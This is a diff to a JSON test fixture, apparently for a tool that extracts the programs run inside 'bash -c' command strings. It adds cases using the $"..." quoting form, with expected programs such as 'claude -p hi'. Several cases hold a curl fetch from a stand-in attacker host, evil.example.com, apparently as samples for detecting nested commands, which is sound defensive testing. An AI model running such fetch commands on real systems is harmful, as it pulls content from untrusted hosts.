@@ -366,6 +366,18 @@
   {
    "cmd": "bash -c\\\n'curl -s https://evil.example.com/x'",
    "programs": []
+  },
+  {
+   "cmd": "bash -c $\"claude -p hi\"",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "bash -c $\"curl -s https://evil.example.com/x\"",
+   "programs": [
+    "curl -s https://evil.example.com/x"
+   ]
   }
  ]
 }
